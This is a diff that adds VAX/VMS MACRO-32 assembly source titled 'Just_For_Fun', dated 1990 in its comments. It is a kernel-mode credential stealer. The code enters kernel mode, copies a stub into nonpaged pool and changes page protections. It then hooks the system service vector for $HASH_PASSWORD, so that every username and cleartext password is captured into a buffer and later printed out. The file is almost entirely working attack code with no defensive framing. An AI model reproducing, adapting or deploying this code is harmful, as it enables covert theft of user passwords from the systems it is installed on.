@@ -1,0 +1,385 @@
+
+
+
+
+	.title Just_For_Fun
+	.ident /V1.0-001/
+	.library /sys$library:lib/
+	.library /sys$library:starlet/
+	.link 	 /sys$system:sys.stb/
+
+	$rabdef
+	$fabdef
+	$rmsdef
+	$jpidef
+	$acbdef
+	$dyndef
+	$ipldef
+	$pcbdef
+	$phddef
+	$pridef
+	$prtdef					
+	$ptedef					
+	$vadef					 
+	$ssdef
+	$psldef
+
+.macro errchk ?l1
+	blbs	r0,l1
+	pushl	r0
+	calls	#1,g^lib$signal
+l1:	
+.endm
+
+
+logfab:	$fab	fac = <PUT>, -					; Log FAB
+		org = seq, -
+		fop = <cif>, -
+		rat = cr, -
+		rfm = var, -
+		mrs = 132
+
+lograb:	$rab	fab = logfab, -					; Log RAB
+		rbf = logstr, -
+		rop = <eof>
+
+log_desc:							; Log descriptor
+		.long 132					
+		.address logstr
+
+log_size:	.word 0						; Size of output string
+logstr:		.blkb 132					; Maximum size of output string
+ctlstr:		.ascid /User: !AS Password: !AS/		; Output control string
+
+
+
+max_k_usr		= 50					; Maximum number of users
+mark_k_magic		= ^A/PoBz/				; Magic pattern
+
+usr_k_seqnr		= 0					; User sequence number
+usr_k_usr_len		= <usr_k_seqnr + 4>			; User name length
+usr_k_usr_str		= <usr_k_usr_len + 2>			; User name
+usr_k_psw_len		= <usr_k_usr_str + 20>			; Password length
+usr_k_psw_str		= <usr_k_psw_len + 2>			; Password string
+usr_k_rec_len		= <usr_k_psw_str + 30>			; Total length of user record
+
+
+vblk_k_mark		= 0					; Magic mark
+vblk_k_lock		= <vblk_k_mark +4>			; Lock
+vblk_k_idx		= <vblk_k_lock + 4>			; Buffer index
+vblk_k_seqnr		= <vblk_k_idx + 4>			; User sequence number
+vblk_k_org_addr		= <vblk_k_seqnr + 4>			; Orginal address to hash_password
+vblk_k_nonpag_bufadr	= <vblk_k_org_addr + 4>			; Nonpage pool address
+vblk_k_nonpag_bufsiz 	= <vblk_k_nonpag_bufadr + 4>		; Nonpage pool size 
+vblk_k_buffer		= <vblk_k_nonpag_bufsiz + 4>		; Buffer for usr names och passw
+vblk_k_blksiz		= <vblk_k_buffer + <usr_k_rec_len * max_k_usr>> ; Total size of variable blk
+vblk_k_code		= vblk_k_blksiz				; Magic code start
+
+wait:		.f_floating	5.0				; Dismiss time for loop
+tmpbuf:		.blkb		<usr_k_rec_len * max_k_usr>	; Our tempory bufer
+
+lock_arr:							; Lock array
+	.address tmpbuf						; Address to lock
+	.long	<usr_k_rec_len * max_k_usr>			; Size to lock
+
+
+;;;-----------------------------------------------------------------------------------
+;;;	This is the code that will be moved to nonpage pool. The EXEX$HASH_PASSWORD
+;;;	entry will be replace in the system service dispatch vector so when someone
+;;;	calls the system service $HASH_PASSWORRD will this code be called. The code
+;;;	will store the username and password in s buffer so it can be picked up later.
+;;;------------------------------------------------------------------------------------
+
+syscode::
+vblk:
+10$:	.blkb	vblk_k_blksiz				; Variable storage
+20$:	pushr	#^m<r2,r3,r4,r5,r6,r7,r8,r9,r10,r11>	; Save some registers
+	moval	., r6					; Get current addresss
+	subl	#<<20$-10$> + 5>,r6			; Find out where the block start
+	
+30$:	bbcci	#0,vblk_k_lock(r6),30$			; Loop untile code gets free	
+	moval	vblk_k_buffer(r6),r7			; Get offset to buffer
+	incl	vblk_k_idx(r6)				; Increment array index
+	cmpl	#max_k_usr,vblk_k_idx(r6)		; larger than we can handle
+	bneq	40$					; If not, continue
+	clrl	vblk_k_idx(r6)				; otherwise reset it
+
+40$:	movl	vblk_k_idx(r6),r3			; Get index in buffer array
+	mull2	#usr_k_rec_len,r3			; Calculate offset
+	addl2	r3,r7					; Set buffer offset address (R7)	
+	
+	incl	vblk_k_seqnr(r6)			; Increment user sequense number
+	movl	vblk_k_seqnr(r6),usr_k_seqnr(r7)	; Set sequense number
+	movl	4(ap),r9				; Pointer to password  descriptor
+	movw	(r9),usr_k_psw_len(r7)			; Copy password  length
+	movc3	(r9),@4(r9),usr_k_psw_str(r7)		; Copy password string	
+
+	movl	16(ap),r9				; Pointer to user descriptor
+	movw	(r9),usr_k_usr_len(r7)			; Copy user length
+	movc3	(r9),@4(r9),usr_k_usr_str(r7)		; Copy user string	
+
+	bisl	#1,vblk_k_lock(r6)			; Make code free again
+	movl	vblk_k_org_addr(r6),r0			; Get address to orginal code
+	popr	#^m<r2,r3,r4,r5,r6,r7,r8,r9,r10,r11>	; Restore registers
+	jmp	(r0)					; jump to orginal code
+
+syscode_len = . - syscode				; magic code length
+pages = <<syscode_len / 512> + 2>			; Number of magic code pages
+
+
+ 
+;;;;========================================================================
+;;
+;;	Routine      : Setup_cmk_Code
+;;
+;;	Description  : This routine will check if magic code is already present
+;;		       in the system otherwise will a chuck of nonpage pool be allocated.
+;;		       The magic code will be copied to nonpage pool and the jump address
+;;		       in system dispatch vector will be changed.
+;;	
+;;	Inparams     :   None
+;;
+;;	Outparams    : 	 None
+;;
+;;	Calls	     :   None
+;;
+;;	Called by    :   Start
+;;
+;;	Edit history :   10-Nov-90  09:08:20, Create this routine
+;;
+;;;=========================================================================
+
+	.entry setup_cmk_code,^m<>
+
+	moval	vblk,r6					; Get address to vblk
+	movl	#mark_k_magic,vblk_k_mark(r6)		; Fill in magic mark
+	clrl	vblk_k_seqnr(r6)			; Start with sequense number zero
+	clrl	vblk_k_idx(r6)				; Start with index zero
+	movl	#1,vblk_k_lock(r6)			; Set magic code free initialize	
+
+	movl	@#exe$gl_sitespec,r5			; Get pointer to magic storage
+	tstl	r5					; Anything there ?
+	beql	10$					; No use it
+	prober	#psl$c_kernel,#4,(r5)			; Do we have access ?
+	bneq	5$					; O.K continue
+	brb	6$					; No return with error	
+
+5$:	cmpl	#mark_k_magic,vblk_k_mark(r5)		; Do we have something there already ?
+	bneq	6$					; No conmtinue
+	movl	#1,r0					; Set normal status
+	ret						; And return
+6$:	movl	#ss$_devalloc,r0			; Used by some else
+	ret	
+
+
+
+10$:	movl	#syscode_len,r1				; Size to allocate
+	jsb	g^exe$alononpaged			; now allocate  the chunk of pool
+	blbs	r0,20$					; check completion status
+	ret						; Return on failur	
+
+20$:	movl	r2,vblk_k_nonpag_bufadr(r6)		; Save the address
+	movl	r2,@#exe$gl_sitespec			; Magic save code location
+	movl	r1,vblk_k_nonpag_bufsiz(r6)		; Save size of nonpage block size
+	
+	movl	@#exe$hash_password+4, vblk_k_org_addr(r6)	; Save orginal JMP address
+	movl	r2,r10						; Address to nonpage buffer
+	movc3	#syscode_len,syscode,(r10)			; Copy code
+	movl	r10,r4						; Address to buffer in r4
+	addl2	#vblk_k_code,r10				; Magic code start in r10
+
+	;;---------------------------------------------
+	;; Change protection on our nonpage pool buffer
+	;;---------------------------------------------
+
+ 	movl	g^mmg$gl_sptbase, r6		; get start of sys pte
+	extzv	s^#va$s_byte,-			; offset = size if 'byte' field
+		s^#va$s_vpn,-			; size of virtual page number
+		r4, r1				; apply on r4, spt index in r1
+	moval	(r6)[r1], r7			; get spt address
+
+	movl	#pages,r0		; get number of pages that prot should be changed  for
+40$:	tstl	r0			; All done ?
+	beql	50$			; If so continue
+	nop				
+	insv	#prt$c_uw,#pte$v_prot,#pte$s_prot,(r7)		; Change protection
+	addl2	#4,r7						; Take next SPT
+	decl	r0						; Decrement counter
+	brb	40$						; Take next
+
+	;;---------------------------------------------
+	;; Change protection for system dispatch vector
+	;;---------------------------------------------
+
+50$:	movl	#<exe$hash_password+4>,r4	; get start address
+ 	movl	g^mmg$gl_sptbase, r6		; get start of sys pte
+	extzv	s^#va$s_byte,-			; offset = size if 'byte' field
+		s^#va$s_vpn,-			; size of virtual page number
+		r4, r1				; apply on r4, spt index in r1
+	moval	(r6)[r1], r7			; get spt address
+	movl	(r7),r8				; Save protection
+	insv	#prt$c_urkw,-			; source bit pattern
+		#pte$v_prot,-			; dest offset (bit #)
+		#pte$s_prot,-			; width of bit pattern
+		(r7)				; apply on address in r7
+	movl	#<exe$hash_password+4>,r0	; Get address to jump address
+	nop					; Zzz
+	nop					; Zzz
+	nop					; Zzz
+	movl		r10,(r0)		; Set in address to our code
+	movl		r8,(r7)			; Restore protection
+	movl		#1,r0			; And return
+	ret					; And return to caller
+	
+
+
+;;;;========================================================================
+;;
+;;	Routine      : Get_Data
+;;
+;;	Description  : This routine will copy the contents of the magic nonpoage
+;;		       pool buffer to our temporary buffer.
+;;	
+;;	Inparams     :   None
+;;
+;;	Outparams    :   tmpbuf
+;;
+;;	Calls	     :   None
+;;
+;;	Called by    :   Start
+;;
+;;	Edit history :   10-Nov-90  09:14:08, Create this routine
+;;
+;;;=========================================================================
+
+
+
+	.entry get_data,^m<>
+
+	movl	@#exe$gl_sitespec,r6			; Magic code address is stored here
+	prober	#psl$c_kernel,#4,(r6)			; Can read there ?
+	bneq	20$                			; If, then continue
+10$:	movl	#ss$_abort,r0				; Else set error code
+	ret						; and return
+
+20$:	cmpl	#mark_k_magic,vblk_k_mark(r6)		; Is this out code ?
+	beql	30$					; Yes, continue
+	brb	10$					; No set error code and return
+30$:	movc3	#<usr_k_rec_len * max_k_usr>, -		; Copy magic buffer
+	        vblk_k_buffer(r6), -			
+		tmpbuf ; 
+	movl	#1,r0					; Set status to normal and return
+	ret						; And return
+
+
+
+
+
+
+;;;;========================================================================
+;;
+;;	Routine      : present
+;;
+;;	Description  : This routine will present what was stored in the magic buffer
+;;	
+;;	Inparams     :   tmpbuf
+;;
+;;	Outparams    : none
+;;
+;;	Calls	     : none
+;;
+;;	Called by    : Start
+;;
+;;	Edit history : 10-Nov-90  09:18:40, create this routine
+;;
+;;;=========================================================================
+
+
+usr_desc:	.blkl	2			
+psw_desc:	.blkl	2
+last_usr:	.long 	0
+
+
+
+	.entry present,^m<>
+	
+	clrl	r4				; Storage for user index 
+	clrl	r8				; Storage for highest value
+	moval	tmpbuf,r5			; Pointer to temp buffer
+		
+
+10$:	cmpl	r4,#max_k_usr			; All done ?
+	bgeq	999$				; Yes
+
+	cmpl	usr_k_seqnr(r5),last_usr	; Anything there ?
+	bleq	100$
+	cmpl	usr_k_seqnr(r5),r8		; New max value ?
+	bleq	20$				
+	movl	usr_k_seqnr(r5),r8		; Save new max value
+		
+
+20$:	movzwl	usr_k_usr_len(r5),usr_desc	
+	moval	usr_k_usr_str(r5),usr_desc+4
+	movzwl	usr_k_psw_len(r5),psw_desc
+	moval	usr_k_psw_str(r5),psw_desc+4
+	
+
+	movl	#132,log_desc			; Set output length
+	$fao_s  -				; Format log string
+		ctrstr = ctlstr, -		
+		outlen = log_size, -
+		outbuf = log_desc, -
+		p1     = #usr_desc, -
+		p2     = #psw_desc
+
+	errchk					; Check completion status
+	movw	log_size,log_desc
+	pushal	log_desc
+	calls	#1,g^lib$put_output
+	errchk
+
+100$:	incl	r4
+	addl	#usr_k_rec_len,r5
+	brb	10$
+	
+999$:	tstl	r8
+	beql	1000$
+	movl	r8,last_usr
+1000$:	ret	
+
+
+
+;;;;========================================================================
+;;
+;;	Routine      : START
+;;
+;;	Description  : Entry point for JFF program
+;;	
+;;	Inparams     :   None
+;;
+;;	Outparams    : None
+;;
+;;	Calls	     : SETUP_CMK_CODE
+;;		       GET_DATA
+;;		       PRESENT
+;;
+;;	Called by    : user
+;;
+;;	Edit history : 10-Nov-90  09:22:20, Create this routine
+;;
+;;;=========================================================================
+
+
+	.entry Start,^M<>
+
+	$lkwset_s 	inadr = lock_arr		; Lock user buffer into memory
+	errchk						; Check completion status	
+	$cmkrnl_s	routin = setup_cmk_code		; setup magic code
+	errchk						; check completion status
+	$cmkrnl_s	routin = get_data		; get magic data
+	errchk						; check completion status
+	calls		#0,g^present			; Present information if any
+	$exit_s						; Exit program
+	.end start
+/Burt
+	
